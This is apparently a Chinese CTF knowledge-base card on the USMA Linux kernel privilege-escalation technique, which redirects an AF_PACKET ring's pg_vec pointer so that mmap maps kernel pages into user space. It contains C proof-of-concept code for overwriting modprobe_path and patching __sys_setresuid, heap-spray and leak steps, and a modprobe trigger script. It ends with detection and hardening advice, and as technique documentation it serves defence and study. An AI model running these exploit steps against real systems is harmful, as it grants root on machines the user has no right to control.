---
id: binary-pwn-kernel-usma-packet-ring-kernel-page-mapping
title: USMA：把 packet ring 的 pg_vec 指针改成内核只读页的虚拟地址，用 packet_mmap 把该内核页映射进用户态直接改写内核代码/数据（modprobe_path、__sys_setresuid 判断分支）
type: scenario
domain: binary
path: binary/pwn/kernel
technique: usma-pg-vec-kernel-page-user-mapping
tags:
- linux-kernel
- af-packet
- packet-ring
- pg-vec
- mmap
- arbitrary-physical-write
- kernel-text-patch
- modprobe-path
- privilege-escalation
- lpe
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:42:54+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；socket/sock_create/packet_create/packet_set_ring/init_prb_bdqc/alloc_pg_vec/packet_mmap/vm_insert_page/validate_page_before_insert 源码与 packet_ring_buffer 联合体偏移、ker 与 praymoon 两段 exp 的 edit(modprobe&~0xfff)、0x86f20、page[0xfd8]=0xeb、block_nr=0x40/8、maybe_base 偏移表均能在正文中找到对应；仅修正基础地址泄露手法描述（去掉正文未出现的 0x21ace0）与 0xeb 改写表述，未在真实内核复现
url: /docs/binary/pwn/kernel/binary-pwn-kernel-usma-packet-ring-kernel-page-mapping/
draft: false
kb_aliases:
- USMA
- user-space mapping attack
- packet_mmap 映射内核代码页
- pg_vec 改内核地址
- vm_insert_page validate_page_before_insert 绕过
- 直接改内核 text
- modprobe_path 改写
- __sys_setresuid 分支 patch
---

## 一句话结论

`packet_mmap()` 会把 `po->rx_ring.pg_vec[i].buffer` 里的**虚拟地址**逐个 `pgv_to_page()` 后交给 `vm_insert_page()` 映射到用户态 VMA；`validate_page_before_insert()` 只拒绝匿名页、Slab 页和带 `page_type` 的页，**内核代码/数据页全部通过**。因此只要用任意写把 `pg_vec[i].buffer` 改成目标内核页的虚拟地址（如 `modprobe_path` 所在页的页首、或 `__sys_setresuid` 所在的内核代码页），一次 `mmap(ring_fd)` 就能在用户态得到该内核页的可写映射，直接改内核 text/rodata 完成提权——这条不经过页表伪造、也不要求漏洞本身能写内核内存，只需要能改掉一个 `pg_vec` 指针。

## 原理

- **pg_vec 是「虚拟地址数组」而不是「页帧数组」**：`alloc_pg_vec()` 里 `pg_vec[i].buffer = alloc_one_pg_vec_page(order)`（`__get_free_pages`），`struct pgv { char *buffer; }`。`packet_mmap()` 遍历 ring 时对每项做 `void *kaddr = rb->pg_vec[i].buffer; page = pgv_to_page(kaddr); vm_insert_page(vma, start, page)`——也就是说 **映射的目标完全由 `buffer` 这个内核虚拟地址决定**，改它等于改「要映射谁」。
- **校验面很窄**：`vm_insert_page()` → `insert_page()` → `validate_page_before_insert(page)` 只检查 `PageAnon(page) || PageSlab(page) || page_has_type(page)`（`page_type` 涉及 `PG_buddy`/`PG_offline`/`PG_table`/`PG_guard`）。内核 `.text`/`.rodata` 所在页既不是 anon 也不是 slab、也没有这些 type 位，因此**能通过校验**；`vm_insert_page` 只要求页是「非复合页的普通页」，不校验映射者是否有权写该页。
- **为什么能拿到写权限**：`packet_mmap` 的 VMA 权限来自用户 `mmap(PROT_READ|PROT_WRITE, MAP_SHARED, ring_fd, 0)` 的请求与 `packet_mmap` 中 `vma->vm_page_prot` 的赋值；`vm_insert_page` 直接把 PTE 指向内核页，因此用户态写入落在内核页的物理内存上——相当于「以用户态指针改写内核 text/rodata」，且不需要关闭 CR0.WP、不需要改页表、不需要 physmap 偏移。
- **两条典型落点**：
  - **数据页（简单）**：`modprobe_path` 在 `.data`，把它所在页映射进来后 `strcpy(&map[modprobe_path & 0xfff], "/tmp/x")`，再触发一次未知格式可执行文件（`execve("/tmp/dummy")`），内核调用 `call_modprobe` 执行 `/tmp/x`（脚本 `chmod 777 /flag`），随后普通用户即可读 flag。这条链只需要「改一个 pg_vec 指针 + 一次 mmap + 一次 execve」。
  - **代码页（更通用但更脆）**：把目标换成 `__sys_setresuid` 所在的代码页，找到 `if (uid != old_uid) return -EPERM` 之类判断分支处的字节改成 `jmp`（原文改的是 `page[0xfd8] = 0xeb`，把该处条件跳转的首字节换成 `EB` 即无条件短跳，具体偏移与指令需按目标内核反汇编确认），此后普通用户调用 `setresuid(0,0,0)` 也能成功，父进程在这些改动生效后直接 `setresuid(0,0,0)` + `system("/bin/sh")`。
- **前置的两个堆侧原语**：USMA 只是「映射谁」的放大器，实际利用还需要（a）一个能改 `pg_vec` 指针的任意写/堆溢出/UAF 复用，以及（b）内核基址。原文两条路径分别是：`ker` 题给 0x40 堆块 UAF + 一次 edit，用 `user_key_payload` 堆喷 + `setxattr` 改写 payload 的 `datalen` 造成越界读泄露 `.text`（`user_free_payload_rcu` 回调指针），再用 `PACKET_RX_RING` 喷 `block_nr` 使 `kcalloc` 得到的 `pg_vec` 正好落在被 UAF 的 0x40 对象上，于是 `edit()` 写的值就是 `pg_vec[i].buffer`；`praymoon` 题则用 `userfaultfd` 卡住 `setxattr` 的拷贝、配合 `CONFIG_SHUFFLE_PAGE_ALLOCATOR` 下两次重试必命中，把 freed 对象的 `pg_vec` 覆盖成 `__sys_setresuid` 页地址。
- **为什么 `block_nr` 决定堆块大小**：`pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL)`，`sizeof(struct pgv)` 为 8，所以 `block_nr = 0x40/8 = 8` 正好是 0x40 桶、`block_nr = 0x200/8 = 64` 是 0x200 桶——**USMA 与目标漏洞对象的 size class 可以精确对齐**。

## 触发条件

- 内核启用 `CONFIG_PACKET`，进程能创建 `AF_PACKET`/`SOCK_RAW` 并 `setsockopt(PACKET_RX_RING/PACKET_TX_RING)`、`mmap` ring；无 `CAP_NET_RAW` 时需允许 unprivileged user namespace，用 `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)` + 写 `uid_map`/`gid_map` 获得该能力（原文 eksp 里 `unshare_setup()` 即此）。
- 存在一个能让攻击者控制 `pg_vec[i].buffer` 的写原语：堆 UAF 后复用、堆溢出越界写、或任意写；尺寸与 `kcalloc(block_nr, 8)` 对齐。
- 已知内核基址（或能泄露/爆破）：用于把 `modprobe_path`、`__sys_setresuid` 等符号换算成虚拟地址；KASLR 开启时必须先泄露 `.text`。
- 目标页不是 anon/slab/带 `page_type` 的页（内核 `.text`/`.data` 满足）；内核未开启禁止用户态映射内核页的加固（如某些发行版的 `CONFIG_STRICT_DEVMEM` 不影响此路，但 LSM/`vm_insert_page` 的额外校验会影响）。

## 利用步骤

1. **建命名空间拿权限**：`fork()` 子进程，`unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)`，写 `/proc/self/setgroups`、`uid_map`、`gid_map`，随后 `socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))` 才不被 `-EPERM` 拒绝。
2. **喷 ring 占位**：`setsockopt(PACKET_VERSION=TPACKET_V3)`，构造 `tpacket_req3{tp_block_nr=<目标桶大小/8>, tp_block_size=0x1000, tp_frame_size=0x800, tp_frame_nr=block_nr*block_size/frame_size}`，`setsockopt(PACKET_RX_RING)`；把返回 fd 存数组，喷若干份提高命中率。
3. **让漏洞写落到 `pg_vec[0].buffer`**：利用 UAF/溢出把某个 ring 的 `pg_vec` 数组首项改成目标内核页虚拟地址（`target & ~0xfff`）；改不动就先用 `setxattr`/`user_key_payload` 之类同尺寸对象定位到具体哪一份被复用（原文用 `setxattr("/tmp","mowen",buf,0x40,0)` 把标记写进 UAF 对象，再 `key_read` 逐个回读匹配 `UKP_TAG` 找出 victim）。
4. **泄露内核基址**：把 `user_key_payload` 的 `datalen` 改成大于实际长度的值（`setxattr` 覆盖到 payload 头部），`key_read` 越界读出相邻对象里的 `.text` 指针；按 `& 0xffff` 低位特征匹配已知符号偏移算 base（ker 题用 `lbuf[i] - 0x608850`；praymoon 题用 `maybe_base=0xffffffffb4200000` 加一组 `maybe_addr[]` 偏移表逐项比对低位）。
5. **mmap 验证并改写**：对每个 ring `mmap(NULL, block_nr*0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)`，用 `strcmp(&map[target & 0xfff], "/sbin/modprobe")` 之类特征判断哪一份映射命中了目标页；命中后在 `map + (target & 0xfff)` 处写入新值（`"/tmp/x"` 或 `0xeb` 单字节 patch）。
6. **触发**：数据页路线执行一个非法格式文件触发 `call_modprobe`；代码页路线直接 `setresuid(0,0,0)` 后 `getuid()` 变 0，再 `system("/bin/sh")`。

## PoC

目标页映射与改写（数据页路线，最小骨架）：

```c
/* 子进程内：把待改写的 pg_vec 指向 modprobe_path 所在页 */
size_t modprobe = vmlinux_base + 0x021d8ce0;      /* 按目标内核换算 */
edit(modprobe & ~0xfff);                          /* 漏洞写原语：改 pg_vec[0].buffer */

for (int i = 0; i < 0x20; i++) {
    char *map = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_SHARED, ring_fd[i], 0);
    if (map == MAP_FAILED) continue;
    if (!strcmp(&map[modprobe & 0xfff], "/sbin/modprobe")) {   /* 命中目标页 */
        strcpy(&map[modprobe & 0xfff], "/tmp/x");
        break;
    }
    munmap(map, 0x8000);
}
```

```c
/* 触发 modprobe：未知格式的可执行文件 */
system("echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' > /tmp/x");
system("chmod +x /tmp/x");
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
system("chmod +x /tmp/dummy");
system("/tmp/dummy");     /* call_modprobe -> /tmp/x -> chmod 777 /flag */
```

代码页路线（patch `__sys_setresuid` 的判断分支）：

```c
size_t page_start = (vmlinux_base + 0x86f20) & ~0xfff;   /* __sys_setresuid 所在页 */
/* 让 pg_vec 指向该页首，再 mmap 33 个页的 ring */
char *page = mmap(NULL, 33 * 4096, PROT_READ | PROT_WRITE, MAP_SHARED, sock_packet, 0);
page[0xfd8] = 0xeb;        /* 把条件跳转改成无条件 jmp */
setresuid(0, 0, 0);        /* 现在是普通用户也能成功 */
```

`pg_vec` 尺寸对齐（`sizeof(struct pgv) == 8`）：

```c
int set_packet_rx_ring(int block_nr, int block_size, int frame_size, int priv, int tov) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int version = TPACKET_V3;
    setsockopt(sock, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));
    struct tpacket_req3 req = {0};
    req.tp_block_nr = block_nr;            /* 目标桶大小 / 8 */
    req.tp_block_size = block_size;        /* 页大小 */
    req.tp_frame_size = frame_size;
    req.tp_frame_nr = block_nr * block_size / frame_size;
    req.tp_retire_blk_tov = tov;
    req.tp_sizeof_priv = priv;
    setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    return sock;
}
```

## 变体与关联

- **变体（目标页选择）**：凡是「改了就有用」的内核数据都可落：`modprobe_path`、`core_pattern`（管道 helper）、`poweroff_cmd`、`selinux_enforcing`、`init_cred` 引用处；代码页可落 `__sys_setresuid`/`__sys_setuid`/权限检查（capable 判断）等分支。数据页改动更稳（不涉及指令对齐与 icache），代码页改动更通用。
- **变体（不改 pg_vec，改已映射页的内容）**：若目标内核页本身就在 ring 映射范围内（例如把 ring 分配成覆盖目标页的连续块），可以省掉改指针这一步，直接写映射内偏移。
- **变体（无需 mmap 的等价原语）**：`pgv_to_page` 的语义也可换成其它「内核虚拟地址→page」的转换入口（如 `vmalloc_to_page` 路径的驱动 mmap），只要驱动把用户给的地址当页指针用。
- **关联**：[[binary-pwn-kernel-buddy-page-spray-packet-tx-ring]]（同一 PF_PACKET ring 的页级分配/释放原语，本卡用它做「映射谁」的放大器）、[[binary-pwn-kernel-d3kshrm-vm-close-refcount-uaf-page-table-hijack]]（把 USMA 当堆喷占位、伪造 page 表）、[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（另一条「用户态任意改内核页」的路线，走页表重叠而非 `vm_insert_page`）、[[binary-pwn-kernel-cve-2024-1086-nft-verdict-double-free-dirty-pagetable-modprobe]]（同样以 `modprobe_path` 收尾）。
- **边界**：需要 `CAP_NET_RAW`（或 unprivileged userns）；`vm_insert_page` 拒绝 anon/slab 页，所以目标必须是普通内核页；只改指针不改页表，因此进程退出/munmap 后改动**仍然留在内核页里**（这是持久化特征，也是取证点）；若内核开启了 `CONFIG_DEBUG_VM`/rodata 严格只读（`CONFIG_STRICT_KERNEL_RWX` 配合 CR0 写保护），对 `.rodata`/`.text` 的写入会触发 fault——`.data` 段的 `modprobe_path` 不受此限。

## 检测与防御

- **攻击面收敛**：关闭 unprivileged user namespace、收紧 `CAP_NET_RAW`；容器 seccomp 阻断 `socket(AF_PACKET, SOCK_RAW, ...)`、`setsockopt(PACKET_RX_RING/TX_RING)`、`unshare(CLONE_NEWUSER|CLONE_NEWNET)`，并限制 `mmap` 的 `MAP_SHARED` 于 packet fd。
- **内核侧加固**：在 `packet_mmap()`/`pgv_to_page()` 路径上加「该页必须属于本 ring 分配范围」的校验（记住分配时记录的 `buffer` 集合或页的 `page->private` 标记），不再信任 `pg_vec[i].buffer`；`vm_insert_page()` 增加「不得插入内核 text/rodata 页」的检查（`is_kernel_text`/`kernel_page_ok`）；开启 `CONFIG_STRICT_KERNEL_RWX` + `rodata=full` 让 `.text`/`.rodata` 在内核页表层面只读（但本手法的 PTE 是新建用户 PTE，需配合「拒绝映射内核页」才根治）。
- **检测**：进程创建 `AF_PACKET` ring 后紧接着 `mmap` 多个 ring 并扫描页内字符串（`/sbin/modprobe` 特征）；`modprobe_path`/`core_pattern` 在运行期被改（可用 eBPF/审计周期性比对）；普通用户 `setresuid(0,0,0)` 成功、`getuid()==0` 但 `cred` 未经正常路径的异常提权事件；内核代码页出现 `0xeb` 短跳等非预期修改（IMMUTABLE 段哈希基线）。
- **取证**：`pg_vec` 指向的地址不在 ring 自身分配区间内；同一 socket 的 `pg_vec_len`/`tp_block_nr` 与 `mmap` 长度不匹配；进程在 userns 里持有 `AF_PACKET` fd 且伴随 `setxattr`/`user_key_payload` 高频创建的特权提升时间相关性。
